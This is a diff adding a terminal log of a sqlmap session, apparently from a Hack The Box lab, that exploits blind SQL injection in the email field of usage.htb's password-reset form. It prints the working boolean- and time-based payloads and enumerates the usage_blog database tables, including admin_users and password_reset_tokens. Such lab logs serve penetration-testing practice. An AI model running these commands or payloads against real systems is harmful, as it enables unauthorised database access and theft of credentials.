@@ -1,0 +1,83 @@
+┌──(root💀kali)-[~]
+└─# sqlmap -r forget-pass.req -p "email" --dbms mysql --level 5 --risk 3 --batch -D usage_blog --tables
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8.6.3#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:28:28 /2024-07-02/
+
+[08:28:28] [INFO] parsing HTTP request from 'forget-pass.req'
+[08:28:28] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: _token=7PkiFs0h1NSXe7DHr6UVUYC2Vem8LvtHoGZdTP7C&email=test@test.de' AND 9420=(SELECT (CASE WHEN (9420=9420) THEN 9420 ELSE (SELECT 7042 UNION SELECT 8380) END))-- -
+
+    Type: time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
+    Payload: _token=7PkiFs0h1NSXe7DHr6UVUYC2Vem8LvtHoGZdTP7C&email=test@test.de' AND 3574=BENCHMARK(5000000,MD5(0x6e597a6b))-- jikk
+---
+[08:28:30] [INFO] testing MySQL
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+[08:28:31] [INFO] confirming MySQL
+[08:28:35] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[08:28:35] [INFO] fetching tables for database: 'usage_blog'
+[08:28:35] [INFO] fetching number of tables for database 'usage_blog'
+[08:28:35] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[08:28:35] [INFO] retrieved: 15
+[08:28:41] [INFO] retrieved: admin_menu
+[08:29:33] [INFO] retrieved: admin_operation_log
+[08:30:52] [INFO] retrieved: admin_permissions
+[08:32:00] [INFO] retrieved: admin_role_menu
+[08:33:18] [INFO] retrieved: admin_role_permissions
+[08:34:25] [INFO] retrieved: admin_role_users
+[08:35:03] [INFO] retrieved: admin_roles
+[08:35:21] [INFO] retrieved: admin_user_permissions
+[08:36:50] [INFO] retrieved: admin_users
+[08:37:05] [INFO] retrieved: blog
+[08:37:24] [INFO] retrieved: failed_jobs
+[08:38:22] [INFO] retrieved: migrations
+[08:39:06] [INFO] retrieved: password_reset_tokens
+[08:40:57] [INFO] retrieved: personal_access_tokens
+[08:42:44] [INFO] retrieved: users
+Database: usage_blog
+[15 tables]
++------------------------+
+| admin_menu             |
+| admin_operation_log    |
+| admin_permissions      |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_role_users       |
+| admin_roles            |
+| admin_user_permissions |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| personal_access_tokens |
+| users                  |
++------------------------+
+
+[08:43:05] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 504 times
+[08:43:05] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/usage.htb'
+
+[*] ending @ 08:43:05 /2024-07-02/
+
+
+┌──(root💀kali)-[~]
+└─#
